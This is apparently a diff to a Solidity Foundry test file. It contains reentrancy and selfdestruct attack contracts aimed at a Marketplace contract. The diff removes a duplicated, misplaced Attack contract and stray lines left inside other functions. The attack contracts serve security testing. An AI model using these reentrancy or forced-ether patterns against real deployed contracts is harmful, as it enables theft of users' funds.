@@ -16,18 +16,6 @@ contract Reentrancy_Attack {
     receive() external payable {
         if (address(marketplace).balance >= amount) {
             marketplace.withdraw(amount);
-
-contract Attack {
-    Marketplace public marketplaceAdmin;
-    uint256 public constant amount = 1 ether;
-
-    constructor(address marketplaceAddress) {
-        marketplaceAdmin = Marketplace(marketplaceAddress);
-    }
-
-    fallback() external payable {
-        if (address(marketplaceAdmin).balance >= amount) {
-            marketplaceAdmin.withdraw(amount);
         }
     }
 
@@ -53,9 +41,6 @@ contract Selfdestruct_Attack {
 
     function attack() external payable {
         selfdestruct(payable(address(marketplace)));
-        require(msg.value >= amount);
-        marketplaceAdmin.addBalance{value: amount}();
-        marketplaceAdmin.withdraw(amount);
     }
 
     function getBalance() public view returns (uint256) {
@@ -67,7 +52,6 @@ contract MarketplaceTest is Test {
     Marketplace public marketplace;
     Reentrancy_Attack public reentrancy_attacker;
     Selfdestruct_Attack public selfdestruct_attacker;
-    Attack public attack;
 
     address public admin = address(0x01);
     address public user1 = address(0x02);
